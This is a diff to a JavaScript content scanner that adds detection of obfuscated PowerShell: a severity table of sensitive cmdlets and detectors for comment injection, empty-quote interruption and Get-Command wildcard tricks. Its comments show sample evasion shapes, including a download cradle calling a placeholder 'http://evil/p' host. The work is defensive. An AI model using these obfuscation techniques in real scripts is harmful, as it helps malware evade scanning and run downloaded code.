@@ -164,6 +164,60 @@ const SENSITIVE_CMD_KEYWORDS = /(?:powershell|pwsh|cmd\.exe|wscript|cscript|msht
 // (see the ClickFix Wrapper branch below) fires when the buffer is the
 // pasted Run-dialog payload, the next link in the same chain.
 const CLICKFIX_CUES = /press\s+win\s*\+\s*r|win\+r|ctrl\s*\+\s*v|paste|verify\s+you\s+are\s+human|captcha|i\s*'?\s*m\s+not\s+a\s+robot|click\s+to\s+verify/i;
+
+// ── Curated PowerShell sensitive-cmdlet table ─────────────────────────────
+// Feeds the Get-Command wildcard resolver (see
+// `_findPsGetCommandWildcardCandidates` below). Each entry is the full
+// canonical cmdlet name; keys are lower-cased. `severity` is the tier
+// propagated to the candidate when the wildcard resolves to exactly
+// that entry. Keep this list narrow — every expansion here fires on
+// one of the most abused LOLBin / sink names, and broadening it risks
+// false positives on benign introspection (e.g. `Get-Command i*` in a
+// help script). Severity "critical" is reserved for direct execution
+// sinks (iex / Invoke-Command / Invoke-Item / the raw invocation of a
+// ScriptBlock-accepting sink); everything else gets "high".
+const KNOWN_PS_CMDLETS_SENSITIVE = Object.freeze({
+  // Execution sinks — resolving to one of these is an auto-critical.
+  'invoke-expression':   'critical',
+  'iex':                 'critical',
+  'invoke-command':      'critical',
+  'invoke-item':         'critical',
+  'invoke-cimmethod':    'critical',
+  'invoke-wmimethod':    'critical',
+  // Download cradles — T1105 ingress tool transfer.
+  'invoke-webrequest':   'high',
+  'invoke-restmethod':   'high',
+  'start-bitstransfer':  'high',
+  'iwr':                 'high',
+  'irm':                 'high',
+  'wget':                'high',
+  'curl':                'high',
+  // Process / service spawners — T1059 / T1569.
+  'start-process':       'high',
+  'start-job':           'high',
+  'new-service':         'high',
+  'new-scheduledtask':   'high',
+  'register-scheduledtask': 'high',
+  'set-mppreference':    'high',
+  // Policy / AMSI bypass enablers.
+  'set-executionpolicy': 'high',
+  'add-type':            'high',
+  'new-object':          'high',
+  // Credential / cred-dumping.
+  'get-credential':      'high',
+  'convertto-securestring': 'high',
+  'convertfrom-securestring': 'high',
+  // Misc sinks / aliases that recur in real droppers.
+  'saps':                'high',
+  'sal':                 'high',
+  'set-alias':           'high',
+  'new-alias':           'high',
+  'icm':                 'critical',
+  'ii':                  'critical',
+  // Reflection primitives used to reach [System.Reflection.Assembly]::Load.
+  'get-member':          'high',
+  'gm':                  'high',
+});
 // ════════════════════════════════════════════════════════════════════════════
 
 
@@ -1152,6 +1206,170 @@ Object.assign(EncodedContentDetector.prototype, {
         offset: m.index,
         length: m[0].length,
         deobfuscated: reversed,
+      });
+    }
+
+    // ── PowerShell comment injection: I<##>nv<#x#>oke<##>-Expression ──
+    //
+    // PowerShell block comments `<# ... #>` are valid tokens, and
+    // placing them inside an identifier is interpreted by the parser
+    // as the surrounding bareword. Attackers use this to dodge
+    // substring matches against the cmdlet name:
+    //   I<#pad#>nvoke<##>-Expression   # parses as Invoke-Expression
+    //   p<# ANY TEXT #>o<##>w<##>ershell
+    //   iex<# padding #>
+    //
+    // Detection: match any identifier-head letter followed by ≥1
+    // `<#...#>` block, followed by more identifier characters. After
+    // stripping the comment bodies, the reconstructed identifier must
+    // hit SENSITIVE_CMD_KEYWORDS — otherwise it was just a legitimate
+    // block comment adjacent to a bareword.
+    //
+    // Comment body bounded at 256 chars; identifier run bounded at 64
+    // chars; no more than 8 comment insertions per candidate. The
+    // regex's non-greedy `{0,256}?` quantifier is safeRegex-bounded
+    // via the enclosing pattern.
+    const commentInjRe = /\b([A-Za-z][A-Za-z0-9_\-]{0,32})((?:<#[\s\S]{0,256}?#>[A-Za-z0-9_\-]{0,32}){1,8})/g;
+    while ((m = commentInjRe.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      // Strip every `<# ... #>` body from the matched run.
+      const raw = m[0];
+      /* safeRegex: builtin */
+      const stripped = raw.replace(/<#[\s\S]{0,256}?#>/g, '');
+      if (stripped.length < 3 || stripped.length >= raw.length) continue;
+      // Must look like a sensitive cmdlet name after stripping.
+      if (!SENSITIVE_CMD_KEYWORDS.test(stripped)) continue;
+      // Amp budget: stripped output must never be more than 3× the
+      // original (impossible here since we only remove characters, but
+      // keep the contract explicit for future edits).
+      const clipped = _clipDeobfToAmpBudget(stripped, raw);
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: 'PowerShell Comment Injection',
+        raw,
+        offset: m.index,
+        length: raw.length,
+        deobfuscated: clipped,
+      });
+    }
+
+    // ── PowerShell quote interruption: i''e''x / p""o""w""e""r""s""h""e""l""l ──
+    //
+    // Adjacent empty strings (`''` or `""`) wedged between identifier
+    // letters. PowerShell's tokeniser reads these as two separate empty
+    // strings appended to the bareword, but AMSI / YARA string-match
+    // pipelines see the literal `i''e''x` and miss the cmdlet name.
+    //
+    // We match a letter, then ≥1 empty-quote-pair + letter run, and
+    // strip the `''`/`""` pairs. Post-strip the collapsed identifier
+    // must hit SENSITIVE_CMD_KEYWORDS.
+    //
+    // Total match length bounded at 128 chars; per-segment letter run
+    // ≤ 8 chars so pathological quoted blocks cannot blow up the
+    // candidate count.
+    const quoteInterruptRe = /\b([A-Za-z])((?:(?:''|"")[A-Za-z0-9_\-]{1,8}){1,12})/g;
+    while ((m = quoteInterruptRe.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      const raw = m[0];
+      // Only real empty-quote-pairs qualify — `'a'` / `"b"` are NOT
+      // the pattern we want (the contents are non-empty).
+      /* safeRegex: builtin */
+      const stripped = raw.replace(/(''|"")/g, '');
+      if (stripped.length < 3 || stripped.length >= raw.length) continue;
+      // Gate on a sensitive keyword (case-insensitive). The raw token
+      // count collapsed to a known LOLBin / cmdlet is the evidence we
+      // want to surface; any other benign hits (e.g. SQL-ish tokens
+      // with `''` escapes) drop silently.
+      if (!SENSITIVE_CMD_KEYWORDS.test(stripped)) continue;
+      const clipped = _clipDeobfToAmpBudget(stripped, raw);
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: 'PowerShell Quote Interruption (single-token)',
+        raw,
+        offset: m.index,
+        length: raw.length,
+        deobfuscated: clipped,
+      });
+    }
+
+
+    //
+    // `Get-Command` (alias `gcm`) takes glob-style wildcards and returns
+    // a CommandInfo whose name is then executed via `&` (call operator).
+    // Shape examples:
+    //   &(gcm i*x) 'payload'                              → iex 'payload'
+    //   &(Get-Command i????e-rest*) -uri http://evil/p   → Invoke-RestMethod
+    //   $c = gcm i??o??-exp*; & $c 'whoami'              → Invoke-Expression
+    //
+    // We match the glob argument (letters, digits, hyphen, `*`, `?`),
+    // convert the glob to a regex, and match it against the curated
+    // `KNOWN_PS_CMDLETS_SENSITIVE` table. If exactly one entry matches,
+    // OR multiple entries match but they all carry the same severity
+    // class, the candidate fires with the resolved cmdlet as
+    // `deobfuscated`. Ambiguous globs (> 5 matches, or mixed-severity
+    // sets) drop — they are usually legitimate introspection patterns.
+    //
+    // Regex is safeRegex-bounded: arg length capped at 64; at most one
+    // leading `[&.]` + optional whitespace; no nested parens.
+    const gcmRe = /[&.]\s*\(\s*(?:Get-Command|gcm)\s+(?:-Name\s+)?['"]?([A-Za-z][A-Za-z0-9*?\-]{2,64})['"]?\s*\)/gi;
+    while ((m = gcmRe.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      const glob = m[1];
+      // Reject permissive globs: require ≥ 2 non-wildcard letters
+      // anywhere in the glob, AND require the glob to contain at
+      // least one concrete letter on the head (so bare `*x`-style
+      // suffix-only patterns drop). `i*x`, `i?x`, `i*-*e` all pass;
+      // `**`, `*x`, `a*` (insufficient letters) drop.
+      const letters = glob.replace(/[*?\-]/g, '');
+      if (letters.length < 2) continue;
+      if (!/^[A-Za-z]/.test(glob)) continue;
+      // Glob → anchored regex. `*` → `.*`, `?` → `.`. Everything else
+      // is literal (only `[A-Za-z0-9\-]` can appear per the outer
+      // regex, so there is nothing to escape). `safeRegex: builtin`
+      // because the input alphabet is bounded by the outer regex.
+      const globRe = '^' + glob.toLowerCase()
+        .replace(/\*/g, '.*')
+        .replace(/\?/g, '.') + '$';
+      /* safeRegex: builtin */
+      let globMatcher;
+      try { globMatcher = new RegExp(globRe); } catch (_) { continue; }
+      const matches = [];
+      for (const cmdlet of Object.keys(KNOWN_PS_CMDLETS_SENSITIVE)) {
+        if (globMatcher.test(cmdlet)) {
+          matches.push({ name: cmdlet, severity: KNOWN_PS_CMDLETS_SENSITIVE[cmdlet] });
+          if (matches.length > 8) break; // cheap overflow guard
+        }
+      }
+      if (matches.length === 0) continue;
+      if (matches.length > 5) continue; // ambiguous — drop silently.
+      // All matches must share severity class — a glob that expands to
+      // a critical sink AND a merely-high cradle is ambiguous and we
+      // don't want to tier-inflate the benign case.
+      const sev = matches[0].severity;
+      if (!matches.every(x => x.severity === sev)) continue;
+      // Canonical resolved name: either the single match, or the list
+      // joined with `|` when the glob collapses a family. The decoded
+      // text must preserve the original call-operator context so the
+      // downstream scorer sees "& <cmdlet>" as an exec shape.
+      const resolved = matches.map(x => x.name).join('|');
+      const callOp = m[0].trim().startsWith('.') ? '.' : '&';
+      const deobfuscated = `${callOp} ${resolved}`;
+      const clipped = _clipDeobfToAmpBudget(deobfuscated, m[0]);
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: 'PowerShell Get-Command Wildcard',
+        raw: m[0],
+        offset: m.index,
+        length: m[0].length,
+        deobfuscated: clipped,
+        _patternIocs: [{
+          url: `Get-Command wildcard \u2014 "${glob}" resolves to ${resolved} (T1027 masquerading; `
+            + `${sev === 'critical' ? 'execution sink' : 'sensitive cmdlet'})`,
+          severity: sev,
+        }],
       });
     }
 
